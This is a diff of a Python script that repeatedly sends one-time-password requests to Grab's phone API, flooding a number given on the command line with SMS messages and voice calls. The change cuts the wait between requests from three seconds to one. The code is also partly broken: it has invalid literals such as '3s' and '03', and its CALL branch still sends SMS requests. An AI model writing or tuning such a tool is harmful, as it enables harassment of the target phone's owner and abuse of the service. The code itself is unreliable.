@@ -3,9 +3,9 @@ import sys
 import time
 import random
 
-fewlist = ('--delay', type=int, help='the delay time (wait time) in seconds (default: 60)')
+fewlist = sys.argv
 
-fewofgod = 3s
+fewofgod = 1
 
 cooldown = int(fewlist[03])
 
@@ -15,7 +15,7 @@ if fewlist[02] == "SMS":
         print("Send Country [" + random.choice(fewza) + "]")
         r = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=' + random.choice(fewza) +'&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
         fewofgod = fewofgod+1
-        time.sleep(3s)
+        time.sleep(1)
 
 elif fewlist[02] == "CALL":
     while fewofgod <= cooldown:
@@ -23,7 +23,7 @@ elif fewlist[02] == "CALL":
         print("Send Country [" + random.choice(fewza) + "]")
         r = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=' + random.choice(fewza) + '&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
         fewofgod = fewofgod+1
-        time.sleep(3s)
+        time.sleep(1)
 
 elif fewlist[02] == "ALL":
     while fewofgod <= cooldown:
@@ -32,7 +32,7 @@ elif fewlist[02] == "ALL":
         r = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=TH&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
         call = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=CALL&countryCode=' + random.choice(fewza) + '&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
         fewofgod = fewofgod+1
-        time.sleep(3s)
+        time.sleep(1)
 
 else:
     print("Fail Choice [SMS,CALL,ALL]")
